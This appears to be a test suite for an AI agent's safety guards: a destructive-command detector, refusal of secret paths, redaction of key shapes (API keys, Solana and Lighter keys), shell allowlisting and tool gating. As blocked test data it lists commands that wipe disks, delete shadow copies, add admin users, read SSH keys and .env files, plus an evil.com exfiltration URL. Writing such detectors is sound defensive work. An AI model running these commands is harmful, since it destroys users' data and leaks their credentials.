import assert from "node:assert/strict";
import { mkdtempSync, readFileSync, realpathSync, rmSync, writeFileSync } from "node:fs";
import os from "node:os";
import path from "node:path";
import { test } from "node:test";
import { ed25519 } from "@noble/curves/ed25519";
import { base58Encode } from "../../../packages/core/src/ids";
import {
  agentShellVerdict,
  buildTools,
  containsSecret,
  isDestructive,
  isSensitivePath,
  redactSecrets,
  runAgentTask,
  shellTouchesSecrets,
  solanaSecretValues,
  type AgentConfig,
  type AgentRunDeps,
} from "./agent";
import type { AgentMsg, AgentTurn, LlmCreds, ToolSpec } from "../llm";

// macOS's temp directory may itself be a symlink. These fixtures exercise
// files inside a real root; symlink escape refusals have their own PC tests.
const temporaryRoot = (prefix: string) => realpathSync(mkdtempSync(path.join(os.tmpdir(), prefix)));

// ── destructive-command detector ─────────────────────────────────────────────

test("isDestructive catches the obvious disasters, chained or not", () => {
  for (const cmd of [
    "rm -rf /",
    "rm -r node_modules",
    "npm install && rm -rf ~",
    "del /s /q C:\\Users",
    "rmdir /s /q build",
    "Remove-Item -Recurse -Force C:\\",
    "format C:",
    "mkfs.ext4 /dev/sda1",
    "dd if=/dev/zero of=/dev/sda",
    "shutdown /s /t 0",
    "reg delete HKLM\\Software /f",
    "net user hacker hunter2 /add",
    "netsh advfirewall set allprofiles state off",
    "git push origin main --force",
    ":(){ :|:& };:",
  ]) {
    assert.equal(isDestructive(cmd), true, `should refuse: ${cmd}`);
  }
});

test("isDestructive lets normal dev commands through", () => {
  for (const cmd of [
    "git status",
    "npm install",
    "npm run build",
    "git clone https://github.com/x/y",
    "node script.mjs",
    "python -m pytest",
    "dir",
    "ls -la",
    "git push origin main",
    "npx tsc --noEmit",
    "cargo build --release",
    "del temp.txt", // plain del without /s /q is not bulk destruction
  ]) {
    assert.equal(isDestructive(cmd), false, `should allow: ${cmd}`);
  }
});

// ── secrets guards ───────────────────────────────────────────────────────────

test("sensitive paths are refused; normal ones aren't", () => {
  for (const p of [".env", "app/.env.local", "grant.json", "C:\\Users\\me\\.merrymen\\settings.json", ".ssh/id_rsa", "wallet.dat", "keys/server.pem"]) {
    assert.equal(isSensitivePath(p), true, `sensitive: ${p}`);
  }
  for (const p of ["src/index.ts", "README.md", "package.json", "envelope.txt", "docs/environment.md"]) {
    assert.equal(isSensitivePath(p), false, `plain: ${p}`);
  }
  assert.equal(shellTouchesSecrets("type C:\\Users\\me\\.merrymen\\grant.json"), true);
  assert.equal(shellTouchesSecrets("cat ~/.ssh/id_rsa"), true);
  assert.equal(shellTouchesSecrets("npm run build"), false);
});

// ── the full shell decision ─────────────────────────────────────────────────

test("agentShellVerdict: allowlist match runs even with auto-shell off", () => {
  const v = agentShellVerdict("git status", { allowlist: ["git status"], autoShell: false });
  assert.deepEqual(v, { run: true });
});

test("agentShellVerdict: beyond allowlist needs auto-shell", () => {
  const off = agentShellVerdict("npm install", { allowlist: [], autoShell: false });
  assert.equal(off.run, false);
  const on = agentShellVerdict("npm install", { allowlist: [], autoShell: true });
  assert.deepEqual(on, { run: true });
});

test("agentShellVerdict: destructive and secrets refused even with auto-shell", () => {
  assert.equal(agentShellVerdict("rm -rf /", { allowlist: [], autoShell: true }).run, false);
  assert.equal(agentShellVerdict("cat .env", { allowlist: [], autoShell: true }).run, false);
  // …even if someone allowlisted it
  assert.equal(agentShellVerdict("rm -rf build", { allowlist: ["rm -rf build"], autoShell: true }).run, false);
});

// ── capability gating of the tool catalog ────────────────────────────────────

const baseCfg = (over: Partial<AgentConfig>): AgentConfig => ({
  capabilities: new Set(),
  filesRoot: undefined,
  shellAllowlist: [],
  appAllowlist: [],
  autoShell: false,
  maxSteps: 10,
  anthropicApiKey: undefined,
  llmModel: "m",
  secrets: [],
  ...over,
});

const io = (remember: (n: string) => boolean = () => true) => ({
  opts: { token: "t" },
  chatId: 1,
  cwd: { value: "" },
  note: () => {},
  remember,
});

test("no capabilities → no tools (not even remember)", () => {
  assert.equal(buildTools(baseCfg({}), io()).length, 0);
});

test("each capability arms exactly its tools (+ remember once any action tool exists)", () => {
  const names = (cfg: AgentConfig) => buildTools(cfg, io()).map((t) => t.spec.name).sort();
  assert.deepEqual(names(baseCfg({ capabilities: new Set(["shell"]) })), ["remember", "run"]);
  assert.deepEqual(names(baseCfg({ capabilities: new Set(["files"]) })), ["list_dir", "read_file", "remember", "send_file", "write_file"]);
  assert.deepEqual(names(baseCfg({ capabilities: new Set(["screen"]) })), ["remember", "screenshot"]);
  assert.deepEqual(names(baseCfg({ capabilities: new Set(["apps"]) })), ["open", "remember"]);
  // keyboard is RCE-equivalent → dark unless auto-shell is armed
  assert.deepEqual(names(baseCfg({ capabilities: new Set(["keyboard"]) })), []);
  assert.deepEqual(names(baseCfg({ capabilities: new Set(["keyboard"]), autoShell: true })), ["hotkey", "remember", "type_text"]);
  // vision without an Anthropic key stays dark (and no action tool → no remember either)
  assert.deepEqual(names(baseCfg({ capabilities: new Set(["vision"]) })), []);
  assert.deepEqual(names(baseCfg({ capabilities: new Set(["vision"]), anthropicApiKey: "sk" })), ["look", "remember"]);
});

test("open tool refuses arbitrary URLs in safe mode (auto-shell off)", async () => {
  const safe = buildTools(baseCfg({ capabilities: new Set(["apps"]) }), io()).find((t) => t.spec.name === "open")!;
  const out = await safe.exec({ target: "https://evil.com/c?d=leak" });
  assert.match(out, /REFUSED/);
  assert.match(out, /auto-shell/); // the URL branch is gated, not the app branch
  // an app not on the allowlist is refused too (no side-effecting launch)
  assert.match(await safe.exec({ target: "notepad" }), /allowlist/);
});

// ── expanded destructive blocklist (the review's confirmed evasions) ─────────

test("isDestructive catches cmd/PowerShell aliases and interpreter deletes", () => {
  for (const cmd of [
    'rd /s /q "C:\\Users\\me\\Documents"',
    "erase /s /q C:\\data\\*",
    "powershell -c \"ri C:\\x -Recurse -Force\"",
    "Remove-Item C:\\x -Rec -fo",
    'node -e "require(\'fs\').rmSync(p,{recursive:true})"',
    "python -c \"import shutil; shutil.rmtree('x')\"",
    "git clean -fdx",
    "vssadmin delete shadows /all /quiet",
    "truncate -s 0 important.db",
    'powershell -c "Stop-Computer -Force"',
    'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v x /d evil /f',
    "sdelete -p 3 secret.txt",
  ]) {
    assert.equal(isDestructive(cmd), true, `should refuse: ${cmd}`);
  }
});

test("isDestructive still lets normal dev commands through", () => {
  for (const cmd of ["git clone https://github.com/x/y", "npm install", "node build.mjs", "python -m pytest", "git status", "npm run build", "reg query HKCU", "git push origin main"]) {
    assert.equal(isDestructive(cmd), false, `should allow: ${cmd}`);
  }
});

test("shellTouchesSecrets catches the glob/recursion evasions, not just literal names", () => {
  assert.equal(shellTouchesSecrets('for /r "%USERPROFILE%" %f in (set*.json) do @type "%f"'), true);
  assert.equal(shellTouchesSecrets('for /r "%USERPROFILE%" %f in (gr*.json) do @copy "%f" x'), true);
  assert.equal(shellTouchesSecrets("dir /s C:\\Users\\me\\*.key"), true);
  assert.equal(shellTouchesSecrets("type settings.json"), true);
  assert.equal(shellTouchesSecrets("npm run build"), false);
});

test("agentShellVerdict refuses the evasions even with auto-shell armed", () => {
  const auto = { allowlist: [] as string[], autoShell: true };
  assert.equal(agentShellVerdict('rd /s /q "C:\\x"', auto).run, false);
  assert.equal(agentShellVerdict('node -e "require(\'fs\').rmSync(x)"', auto).run, false);
  assert.equal(agentShellVerdict('for /r "%USERPROFILE%" %f in (set*.json) do @type "%f"', auto).run, false);
  assert.equal(agentShellVerdict('reg add "HKCU\\...\\Run" /v x /d y /f', auto).run, false);
});

// ── secret-VALUE redaction (the durable, evasion-resistant control) ──────────

test("redactSecrets strips known values and key-shaped blobs", () => {
  const known = ["123456:AAExampleBotTokenValueHere_longenough"];
  const dump = "token=123456:AAExampleBotTokenValueHere_longenough key=sk-ant-api03-ABCDEFGHIJKLMNOP pk=0x" + "a".repeat(64);
  const red = redactSecrets(dump, known);
  assert.ok(!red.includes("AAExampleBotTokenValueHere"), "known bot token stripped");
  assert.ok(!red.includes("sk-ant-api03-ABCDEFGHIJKLMNOP"), "api key shape stripped");
  assert.ok(!red.includes("0x" + "a".repeat(64)), "private key shape stripped");
  assert.match(red, /\[redacted\]/);
  // leaves normal build output alone
  assert.equal(redactSecrets("Compiled successfully in 4.9s", known), "Compiled successfully in 4.9s");
});

test("a Lighter API key file never reaches the agent: refused by path, redacted by shape in every spelling", () => {
  // docs/perps.md rule 5. MERRYMEN_HOME may be anywhere, so `.merr` is not
  // enough: both key-file homes are refused by name.
  assert.equal(isSensitivePath("/srv/agent/perp-keys/x.json"), true);
  assert.equal(isSensitivePath("/data/tenants/t1/perp-key.json"), true);
  assert.equal(shellTouchesSecrets("cat /data/tenants/t1/perp-key.json"), true);
  // Exactly what writePerpKeyFile writes: the 64-hex shape alone used to leave
  // the last 16 hex (a whole 64-bit limb) visible after "[redacted]".
  const bare = "0123456789abcdef".repeat(4) + "a1b2c3d4e5f60718";
  const pub = "11".repeat(40);
  const file = `${JSON.stringify({ v: 1, publicKey: `0x${pub}`, privateKey: `0x${bare}` }, null, 2)}\n`;
  for (const spelling of [`0x${bare}`, bare, `0x${bare.toUpperCase()}`, bare.toUpperCase()]) {
    const red = redactSecrets(`key=${spelling} done`, []);
    assert.equal(red, "key=[redacted] done", spelling);
    assert.equal(containsSecret(spelling, []), true);
  }
  const red = redactSecrets(file, []);
  assert.ok(!red.includes(bare.slice(-16)), "no tail of the key survives");
  assert.match(red, /"privateKey": "\[redacted\]"/);
  assert.equal(containsSecret(file, []), true);
  // A Lighter auth token goes whole, account and key index with it.
  const token = `1790700000:22149:16:${"ab".repeat(80)}`;
  assert.equal(redactSecrets(`Authorization: ${token}`, []), "Authorization: [redacted]");
  // Normal output is untouched.
  assert.equal(redactSecrets("BTC-PERP long 0.01 @ 64000", []), "BTC-PERP long 0.01 @ 64000");
});

test("redactSecrets catches Google AIza keys (no separator after the prefix)", () => {
  const g = "AIzaSyD-ExAmPlEkEyVaLuE1234567890abcd";
  assert.ok(!redactSecrets(`GEMINI=${g}`, []).includes(g), "AIza key stripped");
  assert.equal(containsSecret(`config: ${g}`, []), true);
});

test("containsSecret detects a laundered secret file's bytes", () => {
  assert.equal(containsSecret('{"session":"0x' + "b".repeat(64) + '"}', []), true); // grant-shaped
  assert.equal(containsSecret("MYTOKEN=123456:AAExampleBotTokenValueHere_x", ["123456:AAExampleBotTokenValueHere_x"]), true);
  assert.equal(containsSecret("# My project notes\nBuild passes.", []), false);
});

/** A real Solana keypair: its base58 secret, the id.json file, and a real signature by it. */
function solanaKeypair(seedByte: number) {
  const seed = new Uint8Array(32).fill(seedByte);
  const pub = ed25519.getPublicKey(seed);
  const secret = new Uint8Array([...seed, ...pub]);
  const sig = ed25519.sign(new TextEncoder().encode("merrymen"), seed);
  return { b58: base58Encode(secret), idJson: JSON.stringify([...secret]), pub: base58Encode(pub), sig: base58Encode(sig) };
}

test("Solana secret keys are redacted and refused, as base58 or as an id.json byte array", () => {
  const sol = solanaKeypair(5);
  const pretty = JSON.stringify(JSON.parse(sol.idJson), null, 2);
  const dump = `SOLANA_PRIVATE_KEY=${sol.b58}\n$ cat ~/.config/solana/id.json\n${sol.idJson}\n${pretty}\n`;
  const red = redactSecrets(dump, []);
  assert.ok(!red.includes(sol.b58), "base58 secret stripped");
  assert.ok(!red.includes(sol.idJson) && !red.includes(pretty), "byte arrays stripped");
  assert.equal(red, "SOLANA_PRIVATE_KEY=[redacted]\n$ cat ~/.config/solana/id.json\n[redacted]\n[redacted]\n");
  for (const text of [sol.b58, sol.idJson, pretty]) assert.equal(containsSecret(`file: ${text}`, []), true);
  // Stripped whole even when a known secret sits inside it.
  assert.equal(redactSecrets(`k=${sol.b58}`, [sol.b58.slice(10, 30)]), "k=[redacted]");
});

test("Solana public ids are not secrets: a signature, an address, a mint stay readable", () => {
  const sol = solanaKeypair(6);
  const out = `tx ${sol.sig} from ${sol.pub} mint 2u1tszSeqZ3qBWF3uNGPFc8TzMk2tdiwknnRMWGWjGWH`;
  assert.equal(redactSecrets(out, []), out);
  assert.equal(containsSecret(out, []), false);
  const notAKey = JSON.stringify(Array.from({ length: 64 }, (_, i) => (i * 37 + 11) % 256));
  assert.equal(redactSecrets(notAKey, []), notAKey, "64 bytes that are no keypair");
});

test("the Solana CLI's keypair files are sensitive paths", () => {
  for (const p of ["~/.config/solana/id.json", "id.json", "C:\\Users\\me\\.config\\solana\\id.json", "target/deploy/merrymen_vault-keypair.json", "deployer-keypair.json"]) {
    assert.equal(isSensitivePath(p), true, `sensitive: ${p}`);
  }
  for (const p of ["paid.json", "src/uuid.json", "android/grid.json"]) assert.equal(isSensitivePath(p), false, `plain: ${p}`);
  assert.equal(shellTouchesSecrets("cat ~/.config/solana/id.json"), true);
  assert.equal(shellTouchesSecrets("solana-keygen pubkey target/deploy/merrymen_vault-keypair.json"), true);
});

test("send_file scans the WHOLE file — a secret past the old 200KB window is refused", async () => {
  const root = temporaryRoot("mm-agent-");
  try {
    // secret sits AFTER 200KB of padding — the old head-only scan would miss it
    const laundered = "x".repeat(250_000) + "\nkey=AIzaSyD-ExAmPlEkEyVaLuE1234567890abcd\n";
    writeFileSync(path.join(root, "notes.txt"), laundered);
    const sendFile = buildTools(baseCfg({ capabilities: new Set(["files"]), filesRoot: root }), io()).find((t) => t.spec.name === "send_file")!;
    const out = await sendFile.exec({ path: "notes.txt" });
    assert.match(out, /REFUSED/);
    assert.match(out, /secret/i);
  } finally {
    rmSync(root, { recursive: true, force: true, maxRetries: 10, retryDelay: 50 });
  }
});

test("send_file refuses a file whose secret scan throws: only a file that cannot be read falls through to sending", async () => {
  const root = temporaryRoot("mm-agent-");
  const sends: string[] = [];
  const fetchFn = (async (url: unknown) => {
    sends.push(String(url));
    return Response.json({ ok: false, description: "not in tests" });
  }) as unknown as typeof fetch;
  try {
    writeFileSync(path.join(root, "notes.txt"), "nothing secret-shaped in here");
    // A scan that cannot finish, whatever the reason (here a known value that throws when compared).
    const unscannable = { length: 9, toString: () => { throw new RangeError("Maximum call stack size exceeded"); } } as unknown as string;
    const sendFile = buildTools(baseCfg({ capabilities: new Set(["files"]), filesRoot: root, secrets: [unscannable] }), { ...io(), opts: { token: "t", fetchFn } })
      .find((t) => t.spec.name === "send_file")!;
    assert.equal(await sendFile.exec({ path: "notes.txt" }), "REFUSED: I could not finish scanning that file for secrets — I won't send it.");
    assert.deepEqual(sends, [], "nothing was sent");
  } finally {
    rmSync(root, { recursive: true, force: true, maxRetries: 10, retryDelay: 50 });
  }
});

test("the remember tool persists via the injected callback", async () => {
  const saved: string[] = [];
  const tools = buildTools(baseCfg({ capabilities: new Set(["files"]), filesRoot: os.tmpdir() }), io((n) => {
    saved.push(n);
    return true;
  }));
  const remember = tools.find((t) => t.spec.name === "remember")!;
  const out = await remember.exec({ note: "The Sakura-ios repo is missing hianime.ts" });
  assert.match(out, /remember/i);
  assert.deepEqual(saved, ["The Sakura-ios repo is missing hianime.ts"]);
});

// ── the loop (scripted model, real file tools in a temp root) ────────────────

const CREDS: LlmCreds = { provider: "test", transport: "openai", baseUrl: "http://x", apiKey: "k", model: "m", vision: false };

function makeDeps(cfg: AgentConfig, turns: AgentTurn[], sent: string[], seen?: AgentMsg[][]): AgentRunDeps {
  let i = 0;
  return {
    creds: CREDS,
    cfg,
    opts: { token: "t" },
    chatId: 1,
    send: async (t) => {
      sent.push(t);
    },
    note: () => {},
    remember: () => true,
    soulBlock: "IDENTITY: you are Robin.",
    stopFlag: { stopped: false },
    turnFn: async (_creds, opts: { messages: AgentMsg[]; tools: ToolSpec[]; system: string }) => {
      seen?.push(structuredClone(opts.messages));
      return turns[Math.min(i++, turns.length - 1)]!;
    },
  };
}

test("loop: streams text, executes tools, stops when the model stops", async () => {
  const root = temporaryRoot("mm-agent-");
  try {
    writeFileSync(path.join(root, "hello.txt"), "hi");
    const sent: string[] = [];
    const seen: AgentMsg[][] = [];
    const anthropicContent: NonNullable<AgentTurn["anthropicContent"]> = [
      { type: "thinking", thinking: "private reasoning", signature: "signed-thinking" },
      { type: "text", text: "let me look around", citations: null },
      { type: "tool_use", id: "1", name: "list_dir", input: {}, caller: { type: "direct" } },
    ];
    const deps = makeDeps(
      baseCfg({ capabilities: new Set(["files"]), filesRoot: root }),
      [
        { text: "let me look around", toolUses: [{ id: "1", name: "list_dir", input: {} }], anthropicContent },
        { text: "done — found hello.txt", toolUses: [] },
      ],
      sent,
      seen,
    );
    await runAgentTask("what's in the folder?", deps);
    assert.deepEqual(sent, ["let me look around", "done — found hello.txt"]);
    // the tool result made it back to the model on the second turn
    const second = seen[1]!;
    assert.deepEqual(second.find((m) => m.role === "assistant")?.anthropicContent, anthropicContent);
    const toolMsg = second.find((m) => m.role === "tools");
    assert.ok(toolMsg && toolMsg.role === "tools" && toolMsg.results[0]!.output.includes("hello.txt"));
  } finally {
    rmSync(root, { recursive: true, force: true, maxRetries: 10, retryDelay: 50 });
  }
});

test("loop: a refused shell command surfaces to the model as REFUSED, not an exception", async () => {
  const sent: string[] = [];
  const seen: AgentMsg[][] = [];
  const deps = makeDeps(
    baseCfg({ capabilities: new Set(["shell"]), autoShell: false }),
    [
      { text: "", toolUses: [{ id: "1", name: "run", input: { command: "npm install" } }] },
      { text: "understood", toolUses: [] },
    ],
    sent,
    seen,
  );
  await runAgentTask("install deps", deps);
  const toolMsg = seen[1]!.find((m) => m.role === "tools");
  assert.ok(toolMsg && toolMsg.role === "tools" && toolMsg.results[0]!.output.startsWith("REFUSED"));
});

test("loop: changing directory keeps the signed conversation prefix stable", async () => {
  const root = temporaryRoot("mm-agent-cwd-");
  try {
    const command = `"${process.execPath}" -e "process.stdout.write(process.cwd())"`;
    const content: NonNullable<AgentTurn["anthropicContent"]> = [
      { type: "thinking", thinking: "", signature: "bound-to-initial-prompt" },
      { type: "tool_use", id: "cwd", name: "run", input: { command, cwd: root }, caller: { type: "direct" } },
    ];
    const seen: AgentMsg[][] = [];
    const deps = makeDeps(
      baseCfg({ capabilities: new Set(["shell"]), filesRoot: os.tmpdir(), shellAllowlist: [command] }),
      [
        { text: "", toolUses: [{ id: "cwd", name: "run", input: { command, cwd: root } }], anthropicContent: content },
        { text: "done", toolUses: [] },
      ],
      [], seen,
    );
    const systems: string[] = [];
    const turn = deps.turnFn!;
    deps.turnFn = (creds, opts) => { systems.push(opts.system); return turn(creds, opts); };
    await runAgentTask("Check the working directory", deps);
    assert.equal(systems.length, 2);
    assert.equal(systems[1], systems[0], "signed thinking is bound to the unchanged prefix");
    assert.deepEqual(seen[1]!.find((m) => m.role === "assistant")?.anthropicContent, content);
    const result = seen[1]!.find((m) => m.role === "tools")!.results[0]!;
    assert.ok(result.output.includes(`working dir ${root}`), "current directory is appended as tool data");
  } finally {
    rmSync(root, { recursive: true, force: true, maxRetries: 10, retryDelay: 50 });
  }
});

test("loop: hits the step budget and says so", async () => {
  const sent: string[] = [];
  const deps = makeDeps(
    baseCfg({ capabilities: new Set(["files"]), filesRoot: os.tmpdir(), maxSteps: 2 }),
    [{ text: "still going", toolUses: [{ id: "1", name: "list_dir", input: {} }] }],
    sent,
  );
  await runAgentTask("loop forever", deps);
  assert.equal(sent.filter((s) => s === "still going").length, 2);
  assert.ok(sent[sent.length - 1]!.includes("step budget"));
});

test("loop: the stop flag halts before the next step", async () => {
  const sent: string[] = [];
  const deps = makeDeps(
    baseCfg({ capabilities: new Set(["files"]), filesRoot: os.tmpdir(), maxSteps: 10 }),
    [{ text: "working", toolUses: [{ id: "1", name: "list_dir", input: {} }] }],
    sent,
  );
  const turnFn = deps.turnFn!;
  deps.turnFn = async (c, o) => {
    deps.stopFlag.stopped = true; // owner sends /agent stop mid-turn
    return turnFn(c, o);
  };
  await runAgentTask("task", deps);
  assert.ok(sent.some((s) => s.includes("stopped")));
  assert.equal(sent.filter((s) => s === "working").length, 1);
});

test("loop: no armed tools → honest refusal, no model call", async () => {
  const sent: string[] = [];
  const deps = makeDeps(baseCfg({}), [{ text: "should never run", toolUses: [] }], sent);
  await runAgentTask("task", deps);
  assert.equal(sent.length, 1);
  assert.ok(sent[0]!.includes("no agent tools"));
});

test("loop: file write + read round-trip inside the root; secrets path refused", async () => {
  const root = temporaryRoot("mm-agent-");
  try {
    const sent: string[] = [];
    const seen: AgentMsg[][] = [];
    const deps = makeDeps(
      baseCfg({ capabilities: new Set(["files"]), filesRoot: root }),
      [
        {
          text: "",
          toolUses: [
            { id: "1", name: "write_file", input: { path: "report/notes.md", content: "# hi" } },
            { id: "2", name: "read_file", input: { path: "report/notes.md" } },
            { id: "3", name: "read_file", input: { path: ".env" } },
            { id: "4", name: "read_file", input: { path: "../outside.txt" } },
          ],
        },
        { text: "done", toolUses: [] },
      ],
      sent,
      seen,
    );
    await runAgentTask("write then read", deps);
    const results = seen[1]!.find((m) => m.role === "tools");
    assert.ok(results && results.role === "tools");
    assert.ok(results.results[0]!.output.includes("wrote"));
    assert.equal(results.results[1]!.output, "# hi");
    assert.ok(results.results[2]!.output.startsWith("REFUSED")); // secrets
    assert.ok(results.results[3]!.output.startsWith("REFUSED")); // escape
  } finally {
    rmSync(root, { recursive: true, force: true, maxRetries: 10, retryDelay: 50 });
  }
});

// ── Solana server secrets (review finalise) ──────────────────────────────────

test("a dotfile glob that can name .env.solana.local is refused; ordinary globs and commands are not", () => {
  for (const cmd of ["cat .e*.local", "head -50 ./.en?.solana.local", "sed -n 1,99p .??v.solana.local", "cp .[e]nv.solana.local /tmp/x", "tail '.e*'"]) {
    assert.equal(shellTouchesSecrets(cmd), true, cmd);
  }
  for (const cmd of ["ls -la", "ls *.md", "find . -name '*.ts'", "cat notes.md", "git log --oneline -5", "cp ./a?.txt b.txt", "cd .. && npm run build", "echo done?"]) {
    assert.equal(shellTouchesSecrets(cmd), false, cmd);
  }
});

test("the agent's secret list holds the Solana server secrets from the environment and .env.solana.local, and a read file loses them and its keyed URLs", async () => {
  const root = temporaryRoot("mm-agent-solana-");
  try {
    const seed = Buffer.alloc(32, 9).toString("base64"), dek = Buffer.alloc(32, 4).toString("base64");
    const rpc = "https://mainnet.helius-rpc.com/?api-key=0f0f0f0f-1111-2222-3333-444455556666";
    const fallback = "https://example-rpc.rpcpool.com/abcdef0123456789abcdef0123456789";
    const envFile = path.join(root, ".env.solana.local");
    writeFileSync(envFile, [`MERRYMEN_SOLANA=1`, `MERRYMEN_SOLANA_RPC_MAINNET=${rpc}`, `export MERRYMEN_SOLANA_RPC_MAINNET_FALLBACK="${fallback}"`,
      `MERRYMEN_JUPITER_API_KEY=jup-key-0123456789`, `MERRYMEN_STORE_DEK=${dek}`, `MERRYMEN_SOLANA_FEE_PAYER_SEED=${seed}`, `MERRYMEN_SOLANA_MAX_FEE_LAMPORTS=5000000`].join("\n"));
    const secrets = solanaSecretValues({ MERRYMEN_STORE_DEK: dek, MERRYMEN_SOLANA_FEE_PAYER_SEED: "only-in-env-0123456789" }, [envFile, path.join(root, "missing")]);
    for (const value of [seed, dek, rpc, fallback, "jup-key-0123456789", "only-in-env-0123456789"]) assert.ok(secrets.includes(value), value);
    assert.ok(!secrets.includes("5000000") && !secrets.includes("1"), "settings that are not secrets are left alone");
    // A copy the agent made under another name, and a keyed URL no setting names: neither reaches the model.
    const stray = "https://mainnet.helius-rpc.com/?api-key=9999aaaa-bbbb-cccc-dddd-eeeeffff0000";
    writeFileSync(path.join(root, "copy.txt"), `${readFileSync(envFile, "utf8")}\nlog: provider ${stray} timed out\nseed again ${seed}`);
    const sent: string[] = [];
    const seen: AgentMsg[][] = [];
    const deps = makeDeps(baseCfg({ capabilities: new Set(["files"]), filesRoot: root, secrets }),
      [{ text: "", toolUses: [{ id: "1", name: "read_file", input: { path: "copy.txt" } }] }, { text: "done", toolUses: [] }], sent, seen);
    await runAgentTask("read the copy", deps);
    const results = seen[1]!.find((m) => m.role === "tools");
    assert.ok(results && results.role === "tools");
    const output = results.results[0]!.output;
    for (const value of [seed, dek, rpc, fallback, "jup-key-0123456789", "9999aaaa-bbbb-cccc-dddd-eeeeffff0000"]) assert.ok(!output.includes(value), `${value} reached the model`);
    assert.match(output, /MERRYMEN_SOLANA=1/, "the rest of the file is still read");
    // The setting's shape alone is enough for a value the list does not hold.
    assert.equal(redactSecrets("MERRYMEN_SOLANA_FEE_PAYER_SEED=someOtherSeedValue123", []), "[redacted]");
    assert.equal(containsSecret("MERRYMEN_JUPITER_API_KEY=abcdefgh12345", []), true);
  } finally {
    rmSync(root, { recursive: true, force: true, maxRetries: 10, retryDelay: 50 });
  }
});
